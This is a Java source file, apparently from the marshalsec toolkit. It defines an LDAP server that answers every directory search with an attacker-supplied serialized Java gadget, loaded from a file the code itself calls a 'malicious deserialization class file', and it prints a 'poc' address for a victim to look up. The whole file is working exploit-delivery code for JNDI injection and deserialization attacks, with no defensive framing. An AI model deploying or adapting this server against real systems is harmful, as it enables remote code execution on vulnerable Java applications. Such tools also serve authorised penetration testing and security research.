package marshalsec.jndi;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.File;
import java.io.FileInputStream;
import java.net.InetAddress;
import java.util.UUID;

public class LDAPLocalRefServer {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main(String[] args) {
        int port = 1389;
        // args = new String[] {"D:\\Project\\CommonsCollections\\cc6"};
        if ( args.length < 1 ) {
            System.err.println(LDAPLocalRefServer.class.getSimpleName() + " <gadgets_filepath> [<port>]");
            System.exit(-1);
        }
        else if ( args.length > 1 ) {
            port = Integer.parseInt(args[ 1 ]);
        }

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new LDAPLocalRefServer.OperationInterceptor(args[0]));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

            // useless but necessary when access to uri, of course you can use anything you like, example: your_ip:port/aa
            String tmp = UUID.randomUUID().toString().substring(0, 6);
            String uri = "your_ip:" + port + "/" + tmp;
            System.out.println("poc is: " + uri);

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }
    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private byte[] evilObjectByteArray;

        public OperationInterceptor(String gadgetPath) {
            try {
                File evilFile = new File(gadgetPath);
                if (!evilFile.exists()) {
                    System.err.println(gadgetPath + "not found, Please enter a malicious deserialization class file path");
                }

                FileInputStream fi = new FileInputStream(evilFile);
                int fileSize = (int) evilFile.length();
                this.evilObjectByteArray = new byte[fileSize];
                int offset = 0;
                int numRead = 0;
                while (offset < this.evilObjectByteArray.length
                        && (numRead = fi.read(this.evilObjectByteArray, offset, this.evilObjectByteArray.length - offset)) >= 0) {
                    offset += numRead;
                }
                fi.close();
            } catch (Exception exception) {
                exception.printStackTrace();
            }
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, e);
            } catch (Exception exception) {
                exception.printStackTrace();
            }
        }

        public void sendResult(InMemoryInterceptedSearchResult result, Entry e) throws Exception {
            e.addAttribute("javaClassName", "foo");
            // Return Serialized Gadget
            e.addAttribute("javaSerializedData", this.evilObjectByteArray);
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
